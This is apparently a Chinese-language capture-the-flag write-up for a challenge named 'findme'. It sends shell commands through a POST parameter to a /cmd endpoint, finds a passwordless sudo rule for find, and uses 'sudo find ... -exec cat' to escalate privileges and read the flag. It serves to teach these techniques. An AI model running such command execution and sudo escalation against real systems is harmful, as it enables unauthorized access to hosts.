### findme

我们访问网站发现如下提示：

```
Please POST 'shit' to /cmd
```

提示我们需要post请求提交参数，访问 `/cmd` 目录

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012124518.png" alt="image-20230401212433415" style="zoom: 33%;" />

提示在环境变量中没有发现ls命令，于是我们使用绝对路径：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012126403.png" alt="image-20230401212627339" style="zoom:50%;" />

查看到了flag在根目录下面，于是我们使用 :

```
shit=/bin/cat flag
```

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012128020.png" alt="image-20230401212818951" style="zoom: 33%;" />

提示我们没有权限，于是我们使用命令：

```
shit=/usr/bin/sudo -l
```

`sudo -l` 会显示出`sudo使用者`的权限

![image-20230401213116794](https://raw.githubusercontent.com/leekosss/photoBed/master/202304012131905.png)

提示当前用户：`ctf` 在 `/usr/bin/find` 使用`sudo`可以不需要密码(`NOPASSWD`) 

[linux中sudo免密码](https://knightyun.github.io/2019/06/20/sudo-nopasswd)

我们查看一下根目录下 `start.sh` 内容：

```
shit=/bin/cat start.sh
```

start.sh

```bash
#! /bin/bash


useradd ctf
echo "ctf ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/ctf && chmod 0440 /etc/sudoers.d/ctf  # 此处给个findNOPASSWD，并修改权限

su - ctf -c "/main"
```

根据以上分析，我们需要知道`find命令`还可以`命令执行`：

例如：

```bash
find flag -exec cat f* \;   # 在bash环境下有特殊意义，因此利用反斜杠来转义
```

在当前目录下找到flag文件，并且执行命令：`cat f*`，

**-exec和 \;之间就是find后的额外命令**



因此，我们可以使用sudo提权find，查看flag文件内容：

```bash
shit=/usr/bin/sudo find /flag -exec cat flag \;
```

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012144631.png" alt="image-20230401214440555" style="zoom: 33%;" />

